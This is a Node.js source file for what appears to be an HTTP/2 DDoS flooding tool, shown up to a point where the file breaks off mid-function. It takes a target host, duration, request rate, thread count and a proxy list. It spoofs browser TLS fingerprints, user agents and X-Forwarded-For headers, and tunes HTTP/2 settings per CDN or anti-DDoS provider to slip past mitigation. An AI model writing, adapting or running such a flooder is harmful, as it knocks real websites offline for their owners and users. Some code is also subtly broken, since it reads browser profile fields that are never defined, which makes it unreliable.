const net = require("net");
const http2 = require("http2");
const http = require('http');
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const dns = require('dns');
const fetch = require('node-fetch');
const util = require('util');
const socks = require('socks').SocksClient;
const crypto = require("crypto");
const HPACK = require('hpack');
const fs = require("fs");
const os = require("os");
const colors = require("colors");

const JA3_PROFILES = {
    "chrome": {
        ciphers: "GREASE:" + [
            "TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256",
            "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256", "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
            "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384", "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
            "TLS_RSA_WITH_AES_128_GCM_SHA256"
        ].sort(() => Math.random() - 0.5).join(":"),
        sigalgs: ["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256", "ecdsa_secp384r1_sha384"].sort(() => Math.random() - 0.5).join(":"),
        ecdhCurve: ["GREASE", "X25519", "P-256", "P-384", "P-521"].sort(() => Math.random() - 0.5).join(":"),
        secureProtocol: ['TLSv1.3_method', 'TLSv1.2_method'],
    },
    "firefox": {
        ciphers: "GREASE:" + [
            "TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256",
            "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256", "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256"
        ].sort(() => Math.random() - 0.5).join(":"),
        sigalgs: ["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256"].sort(() => Math.random() - 0.5).join(":"),
        ecdhCurve: ["GREASE", "X25519", "P-256", "P-384"].sort(() => Math.random() - 0.5).join(":"),
        secureProtocol: ['TLSv1.3_method', 'TLSv1.2_method'],
    },
    "safari": {
        ciphers: "GREASE:" + [
            "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256", "TLS_AES_128_GCM_SHA256",
            "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384"
        ].sort(() => Math.random() - 0.5).join(":"),
        sigalgs: ["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256"].sort(() => Math.random() - 0.5).join(":"),
        ecdhCurve: ["GREASE", "X25519", "P-256"].sort(() => Math.random() - 0.5).join(":"),
        secureProtocol: ['TLSv1.3_method', 'TLSv1.2_method'],
    },
};

const referers = ["https://www.google.com/", "https://www.youtube.com/", "https://www.facebook.com/", undefined];
const origins = ["https://www.google.com", "https://www.youtube.com", "https://www.facebook.com", undefined];

function randomElement(array) {
    return array[Math.floor(Math.random() * array.length)];
}

// Định nghĩa BROWSER_PROFILES
const BROWSER_PROFILES = {
    "chrome": {
        acceptLanguages: {
            "US": "en-US,en;q=0.9",
            "VN": "vi-VN,vi;q=0.9,en-US;q=0.8",
            "FR": "fr-FR,fr;q=0.9,en-US;q=0.8"
        },
        acceptEncodings: ["gzip, deflate, br, zstd", "gzip, deflate, br", "gzip, deflate"],
        secFetchSites: ["same-origin", "cross-site", "none"],
        secFetchDests: ["document", "script", "image"],
        secFetchModes: ["navigate", "cors", "no-cors"],
        cacheControls: ["no-cache", "max-age=0", "no-store", undefined],
        getSpecificHeaders: (browser, version, platform, isMobile, fullVersion) => ({
            "sec-ch-ua": `"Google Chrome";v="${version}", "Chromium";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": isMobile ? "?1" : "?0",
            "sec-ch-ua-platform": `"${platform}"`,
            "upgrade-insecure-requests": Math.random() < 0.8 ? "1" : undefined,
            "priority": Math.random() < 0.7 ? "u=0, i" : undefined
        })
    },
    "safari": {
        acceptLanguages: {
            "US": "en-US,en;q=0.9",
            "VN": "vi-VN,vi;q=0.9,en-US;q=0.8",
            "FR": "fr-FR,fr;q=0.9,en-US;q=0.8"
        },
        acceptEncodings: ["gzip, deflate", "br"],
        secFetchSites: ["same-origin", "cross-site", "none"],
        secFetchDests: ["document", "iframe"],
        secFetchModes: ["navigate", "cors"],
        cacheControls: ["no-cache", "max-age=0", undefined],
        getSpecificHeaders: (browser, version, platform, isMobile, fullVersion) => ({
            "sec-ch-ua": `"Safari";v="${version}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": isMobile ? "?1" : "?0",
            "sec-ch-ua-platform": `"${platform}"`
        })
    },
    "firefox": {
        acceptLanguages: {
            "US": "en-US,en;q=0.9",
            "VN": "vi-VN,vi;q=0.9,en-US;q=0.8",
            "FR": "fr-FR,fr;q=0.9,en-US;q=0.8"
        },
        acceptEncodings: ["gzip, deflate", "br"],
        secFetchSites: ["same-origin", "cross-site", "none"],
        secFetchDests: ["document", "script"],
        secFetchModes: ["navigate", "cors"],
        cacheControls: ["no-cache", "max-age=0", undefined],
        getSpecificHeaders: (browser, version, platform, isMobile, fullVersion) => ({
            "sec-ch-ua": `"Firefox";v="${version}"`,
            "sec-ch-ua-mobile": isMobile ? "?1" : "?0",
            "sec-ch-ua-platform": `"${platform}"`
        })
    },
    // Thêm các browser khác (edge, brave, opera, operagx, duckduckgo, mobile-*) tương tự nếu cần
};

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].sort(() => Math.random() - 0.5).join(":");

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

const urihost = [
    'google.com', 'youtube.com', 'facebook.com', 'baidu.com', 'wikipedia.org',
    'twitter.com', 'amazon.com', 'yahoo.com', 'reddit.com', 'netflix.com'
];

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length - 1)];
}

function randstr(length) {
    const characters = "0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}

function randnum(minLength, maxLength) {
    const characters = '0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}

const cplist = [
    "TLS_AES_128_CCM_8_SHA256",
    "TLS_AES_128_CCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256"
];
var cipper = cplist[Math.floor(Math.random() * cplist.length)];

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);

require("events").EventEmitter.defaultMaxListeners = 0;

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];
let SignalsList = sigalgs.sort(() => Math.random() - 0.5).join(':');

const ecdhCurve = ["GREASE", "X25519", "P-256", "P-384", "P-521", "X448"].sort(() => Math.random() - 0.5).join(":");
const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

if (process.argv.length < 7) {
    console.log(`Usage: node b.js <host> <time> <req> <thread> <proxy.txt>`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
};

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

class NetSocket {
    constructor() {}

    async SOCKS5(options, callback) {
        const address = options.address.split(':');
        socks.createConnection({
            proxy: {
                host: options.host,
                port: options.port,
                type: 5
            },
            command: 'connect',
            destination: {
                host: address[0],
                port: +address[1]
            }
        }, (error, info) => {
            if (error) {
                return callback(undefined, error);
            } else {
                return callback(info.socket, undefined);
            }
        });
    }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
        const buffer = new Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
        });

        connection.setTimeout(options.timeout * 100000);
        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

const lookupPromise = util.promisify(dns.lookup);
let isp;
let geoCountryCode = 'US';

async function getIPAndISP(url) {
    try {
        const { address } = await lookupPromise(url);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp;
            geoCountryCode = data.countryCode;
        }
    } catch (error) {}
}

const targetURL = parsedTarget.host;
getIPAndISP(targetURL);

const MAX_RAM_PERCENTAGE = 85;
const RESTART_DELAY = 1000;

function getRandomHeapSize() {
    const min = 1000;
    const max = 5222;
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

if (cluster.isMaster) {
    console.clear();
    console.log('\x1b[38;2;243;12;255m╔═════════════╦[+]║Attack \x1b[38;5;55mSent║[+]╦═════════════╗\x1b[0m');
    console.log(`\x1b[1;36m  [Target]   : \x1b[38;5;55m${process.argv[2]}\x1b[0m`);
    console.log(`\x1b[1;36m  [proxy]    : ${process.argv[6]}\x1b[38;5;55m   || Total: ${proxies.length.toString()}`);
    console.log(`\x1b[1;36m  [Duration] : \x1b[38;5;55m${process.argv[3]} seconds\x1b[0m`);
    console.log(`\x1b[1;36m  [Rate]     : \x1b[38;5;55m${process.argv[4]} req/s\x1b[0m`);
    console.log(`\x1b[1;36m  [Threads]  : \x1b[38;5;55m${process.argv[5]}\x1b[0m`);
    console.log(`\x1b[1;36m  [Owner]    : \x1b[38;5;55m  \x1b[0m`);
    console.log('\x1b[38;2;243;12;255m╚═════════════╩[+]║Leak \x1b[38;5;55mDDOS║[+]╩═════════════╝\x1b[0m');

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                const heapSize = getRandomHeapSize();
                cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
            restartScript();
        }
    };

    setInterval(handleRAMUsage, 5000);

    for (let counter = 1; counter <= args.threads; counter++) {
        const heapSize = getRandomHeapSize();
        cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
    }
} else {
    setInterval(runFlooder, 1000 / args.Rate); // Điều chỉnh interval dựa trên Rate
}

const platformVersions = {
    "Windows": ["10.0", "11.0"],
    "macOS": ["10.15.7", "11.6", "12.0", "13.0", "14.0"],
    "Linux": [undefined], // Không cần version cụ thể
    "Android": ["10.0", "11.0", "12.0", "13.0", "14.0"],
    "iOS": ["15.0", "16.0", "17.0", "18.0"]
};
const architectures = ["x86", "arm64", "arm"];

const resourcePaths = [
    { path: parsedTarget.path, dest: "document" },
    { path: '/assets/css/style.css', dest: "style" },
    { path: '/assets/js/main.js', dest: "script" },
    { path: '/images/logo.png', dest: "image" },
    { path: '/favicon.ico', dest: "image" },
    { path: '/about', dest: "document" },
    { path: '/contact', dest: "document" },
    { path: '/blog/post-123', dest: "document" },
    { path: '/api/data', dest: "empty" },
    { path: '/search?q=test', dest: "document" },
    { path: '/products/category/item', dest: "document" },
];

function getRandomBrowser() {
    const weights = {
        "chrome": 0.20, "mobile-chrome": 0.15, "safari": 0.15, "mobile-safari": 0.10,
        "firefox": 0.15, "mobile-firefox": 0.10, "edge": 0.05, "brave": 0.05,
        "opera": 0.03, "operagx": 0.03, "duckduckgo": 0.04
    };
    const total = Object.values(weights).reduce((a, b) => a + b, 0);
    const rand = Math.random() * total;
    let sum = 0;
    for (const browser in weights) {
        sum += weights[browser];
        if (rand <= sum) return browser;
    }
    return "chrome";
}

function uapick(browser, version, platform, isMobile, fullVersion) {
    const userAgents = {
        "chrome": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${randomElement(platformVersions["Windows"])}; Win64; x64` : platform === "macOS" ? `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}` : platform === "Linux" ? "X11; Linux x86_64" : `Linux; Android ${randomElement(platformVersions["Android"])}; ${["Pixel", "Samsung", "Xiaomi"][Math.floor(Math.random() * 3)]}`}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36`,
        "safari": `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}_${Math.floor(Math.random() * 6)}) AppleWebKit/605.1.${Math.floor(Math.random() * 20)} (KHTML, like Gecko) Version/${version}.0 Safari/605.1.${Math.floor(Math.random() * 20)}`,
        "firefox": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${randomElement(platformVersions["Windows"])}; Win64; x64` : platform === "macOS" ? `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}` : platform === "Linux" ? "X11; Linux x86_64" : `Android ${randomElement(platformVersions["Android"])}; Mobile`}) Gecko/20100101 Firefox/${version}.0`,
        "edge": `Mozilla/5.0 (Windows NT ${randomElement(platformVersions["Windows"])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 Edg/${fullVersion}`,
        "brave": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${randomElement(platformVersions["Windows"])}; Win64; x64` : platform === "macOS" ? `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}` : "X11; Linux x86_64"}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 Brave/${version}`,
        "opera": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${randomElement(platformVersions["Windows"])}; Win64; x64` : platform === "macOS" ? `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}` : "X11; Linux x86_64"}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 OPR/${version}.0.0.0`,
        "operagx": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${randomElement(platformVersions["Windows"])}; Win64; x64` : `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}`}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 OPR/${version}.0.0.0 (Edition GX)`,
        "duckduckgo": `Mozilla/5.0 (${platform === "Windows" ? `Windows NT ${randomElement(platformVersions["Windows"])}; Win64; x64` : platform === "macOS" ? `Macintosh; Intel Mac OS X 10_${Math.floor(15 + Math.random() * 2)}` : `Linux; Android ${randomElement(platformVersions["Android"])}`}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36 DuckDuckGo/${version}`,
        "mobile-chrome": `Mozilla/5.0 (Linux; Android ${randomElement(platformVersions["Android"])}; ${["Pixel", "Samsung", "Xiaomi", "OnePlus"][Math.floor(Math.random() * 4)]} ${Math.floor(6 + Math.random() * 4)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Mobile Safari/537.36`,
        "mobile-safari": `Mozilla/5.0 (iPhone; CPU iPhone OS ${randomElement(platformVersions["iOS"])} like Mac OS X) AppleWebKit/605.1.${Math.floor(Math.random() * 20)} (KHTML, like Gecko) Version/${version}.0 Mobile/15E148 Safari/604.1`,
        "mobile-firefox": `Mozilla/5.0 (Android ${randomElement(platformVersions["Android"])}; Mobile; rv:${version}.0) Gecko/${version}.0 Firefox/${version}.0`
    };
    return userAgents[browser];
}

const headerFunc = (parsedTarget, browser, version, platform, isMobile, fullVersion, geoCountryCode) => {
    let profile = BROWSER_PROFILES[browser];
    if (typeof profile === 'string') {
        profile = BROWSER_PROFILES[profile];
    }

    const acceptLanguage = profile.acceptLanguages[geoCountryCode] || profile.acceptLanguages["US"];

    const secFetchSite = randomElement(profile.secFetchSites);
    let referer = undefined;
    let origin = undefined;

    if (secFetchSite === "same-origin" || secFetchSite === "same-site") {
        referer = `https://${parsedTarget.host}/`;
        origin = `https://${parsedTarget.host}`;
    } else if (secFetchSite === "cross-site" && Math.random() < 0.2) { // 20% cơ hội
        referer = randomElement(referers);
        origin = randomElement(origins);
    }

    const baseHeaders = {
        ":method": "GET",
        ":authority": Math.random() < 0.5 ? parsedTarget.host : `www.${parsedTarget.host}`,
        ":scheme": "https",
        ":path": parsedTarget.path || "/",
        "user-agent": uapick(browser, version, platform, isMobile, fullVersion),
        "accept": Math.random() < 0.7 ?
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" :
            "application/json, text/plain, */*;q=0.8",
        "accept-encoding": randomElement(profile.acceptEncodings),
        "accept-language": acceptLanguage,
        "cache-control": randomElement(profile.cacheControls),
        "sec-fetch-dest": randomElement(profile.secFetchDests),
        "sec-fetch-mode": randomElement(profile.secFetchModes),
        "sec-fetch-site": secFetchSite,
        "dnt": Math.random() < 0.1 ? "1" : undefined // Giảm từ 0.5 xuống 0.1
    };

    const specificHeaders = profile.getSpecificHeaders(browser, version, platform, isMobile, fullVersion);
    Object.assign(baseHeaders, specificHeaders);

    if (referer) baseHeaders["referer"] = referer;
    if (origin) baseHeaders["origin"] = origin;

    // Thêm header động
    if (Math.random() < 0.3) baseHeaders["x-forwarded-for"] = `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;

    // Xóa header undefined
    Object.keys(baseHeaders).forEach(key => baseHeaders[key] === undefined && delete baseHeaders[key]);

    return baseHeaders;
};

function taoDoiTuongNgauNhien() {
    const doiTuong = {};
    const maxi = getRandomInt(2, 3);
    for (let i = 1; i <= maxi; i++) {
        const key = 'cf-sec-' + generateRandomString(1, 9);
        const value = generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12);
        doiTuong[key] = value;
    }
    return doiTuong;
}

class SessionManager {
    constructor() {
        this.cookies = {};
        this.cacheHeaders = {};
    }

    addCookies(host, setCookieHeaders) {
        if (!this.cookies[host]) {
            this.cookies[host] = {};
        }
        setCookieHeaders.forEach(cookieStr => {
            try {
                const parts = cookieStr.split(';')[0].split('=');
                if (parts.length >= 2) {
                    this.cookies[host][parts[0].trim()] = parts.slice(1).join('=').trim();
                }
            } catch (e) {}
        });
    }

    getCookieHeader(host) {
        if (this.cookies[host]) {
            const cookieString = Object.entries(this.cookies[host]).map(([name, value]) => `${name}=${value}`).join('; ');
            return cookieString || null;
        }
        return null;
    }

    addCacheHeaders(path, etag, lastModified) {
        this.cacheHeaders[path] = { etag, lastModified };
    }

    getCacheHeaders(path) {
        return this.cacheHeaders[path];
    }
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedTarget.protocol === "https:" ? "443" : "80";
    const clength = randomElement(urihost);

    const browser = getRandomBrowser();
    let browserProfile = BROWSER_PROFILES[browser];
    if (typeof browserProfile === 'string') {
        browserProfile = BROWSER_PROFILES[browserProfile];
    }

    const version = Math.floor(Math.random() * (browserProfile.versions.max - browserProfile.versions.min + 1)) + browserProfile.versions.min;
    const platform = randomElement(browserProfile.platforms);
    const isMobile = browser.includes("mobile");
    const fullVersion = `${version}.0.${Math.floor(Math.random() * 10000)}.${Math.floor(Math.random() * 100)}`; // Tăng tính thực tế

    const baseHeaders = headerFunc(parsedTarget, browser, version, platform, isMobile, fullVersion, geoCountryCode);

    let ja3Profile = JA3_PROFILES[browser];
    if (typeof BROWSER_PROFILES[browser] === 'string') {
        ja3Profile = JA3_PROFILES[BROWSER_PROFILES[browser]];
    }
    if (!ja3Profile) {
        ja3Profile = {
            ciphers: ciphers,
            sigalgs: SignalsList,
            ecdhCurve: ecdhCurve,
            secureProtocol: ['TLSv1.3_method', 'TLSv1.2_method'],
        };
    }

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: `${parsedTarget.host}:443`,
        timeout: 10
    };

    Socker.HTTP(proxyOptions, async (connection, error) => {
        if (error || Math.random() < 0.1) { // 10% hủy kết nối
            connection?.destroy();
            return runFlooder();
        }
        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ["h2", "http/1.1"],
            ciphers: ja3Profile.ciphers,
            requestCert: true,
            sigalgs: ja3Profile.sigalgs,
            socket: connection,
            ecdhCurve: ja3Profile.ecdhCurve,
            honorCipherOrder: true,
            rejectUnauthorized: false,
            secureProtocol: ja3Profile.secureProtocol[Math.floor(Math.random() * ja3Profile.secureProtocol.length)],
            secureOptions: secureOptions,
            host: parsedTarget.host,
            servername: parsedTarget.host,
        };

        const dynamicSecureContext = tls.createSecureContext({
            ciphers: tlsOptions.ciphers,
            sigalgs: tlsOptions.sigalgs,
            honorCipherOrder: tlsOptions.honorCipherOrder,
            secureOptions: tlsOptions.secureOptions,
            secureProtocol: tlsOptions.secureProtocol
        });
        tlsOptions.secureContext = dynamicSecureContext;

        const tlsSocket = tls.connect(parsedPort, parsedTarget.host, tlsOptions);

        tlsSocket.allowHalfOpen = true;
        tlsSocket.setNoDelay(true);
        tlsSocket.setKeepAlive(true, 60000);
        tlsSocket.setMaxListeners(0);

        function generateJA3Fingerprint(socket) {
            const cipherInfo = socket.getCipher();
            const supportedVersions = socket.getProtocol();
            if (!cipherInfo) return null;
            const ja3String = `${cipherInfo.name}-${cipherInfo.version}:${supportedVersions}:${cipherInfo.bits}`;
            const md5Hash = crypto.createHash('md5');
            md5Hash.update(ja3String);
            return md5Hash.digest('hex');
        }

        tlsSocket.on('connect', () => {
            const ja3Fingerprint = generateJA3Fingerprint(tlsSocket);
        });

        function getSettingsBasedOnISP(isp) {
            const defaultSettings = {
                headerTableSize: 65536,
                initialWindowSize: Math.random() < 0.5 ? 6291456 : 33554432,
                maxHeaderListSize: 262144,
                enablePush: false,
                maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000,
                maxFrameSize: 16384,
                enableConnectProtocol: false,
            };

            const settings = { ...defaultSettings };

            if (isp === 'Cloudflare, Inc.') {
                settings.maxConcurrentStreams = Math.random() < 0.5 ? 100 : 1000;
                settings.initialWindowSize = 65536;
                settings.maxFrameSize = 16384;
            } else if (['FDCservers.net', 'OVH SAS', 'VNXCLOUD'].includes(isp)) {
                settings.headerTableSize = 4096;
                settings.initialWindowSize = 65536;
                settings.maxFrameSize = 16777215;
                settings.maxConcurrentStreams = 128;
            } else if (['Akamai Technologies, Inc.', 'Akamai International B.V.'].includes(isp)) {
                settings.headerTableSize = 4096;
                settings.maxConcurrentStreams = 100;
                settings.initialWindowSize = 6291456;
            } else if (['Fastly, Inc.', 'Optitrust GmbH'].includes(isp)) {
                settings.headerTableSize = 4096;
                settings.initialWindowSize = 65535;
                settings.maxFrameSize = 16384;
            } else if (isp === 'Ddos-guard LTD') {
                settings.maxConcurrentStreams = 8;
                settings.initialWindowSize = 65535;
                settings.maxFrameSize = 16777215;
            } else if (['Amazon.com, Inc.', 'Amazon Technologies Inc.'].includes(isp)) {
                settings.maxConcurrentStreams = 100;
                settings.initialWindowSize = 65535;
            } else if (['Microsoft Corporation', 'Vietnam Posts and Telecommunications Group', 'VIETNIX'].includes(isp)) {
                settings.headerTableSize = 4096;
                settings.initialWindowSize = 8388608;
                settings.maxFrameSize = 16384;
            } else if (isp === 'Google LLC') {
                settings.headerTableSize = 4096;
                settings.initialWindowSize = 1048576;
                settings.maxFrameSize = 16384;
            } else {
                settings.headerTableSize = 65535;
                settings.maxConcurrentStreams = 1000;
                settings.initialWindowSize = 6291456;
            }

            return settings;
        }

        let hpack = new HPACK();
        let client;
        const clients = [];
        client = http2.connect(parsedTarget.href, {
            protocol: "https",
            createConnection: () => tlsSocket,
            settings: getSettingsBasedOnISP(isp),
            socket: tlsSocket,
        });
        clients.push(client);
        client.setMaxListeners(0);

        const updateWindow = Buffer.alloc(4);
        updateWindow.writeUInt32BE(Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105, 0);
        client.on('remoteSettings', (settings) => {
            const localWindowSize = Math.floor(Math.random() * (19963105 - 15663105 + 1)) + 15663105;
            client.setLocalWindowSize(localWindowSize, 0);
        });

        client.on('connect', () => {
            client.ping((err, duration, payload) => {});
            client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('Client Hello'));
        });

        const sessionManager = new SessionManager();

        clients.forEach(client => {
            const intervalId = setInterval(() => {
                async function sendRequests() {
                    if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                        if (Math.random() < 0.1) {
                            await new Promise(resolve => setTimeout(resolve, getRandomInt(1000, 5000)));
                        }

                        for (let i = 0; i < args.Rate; i++) {
                            const requestPromise = new Promise(async (resolve, reject) => {
                                const resource = randomElement(resourcePaths);
                                const selectedPath = resource.path;
                                const secFetchDest = resource.dest;
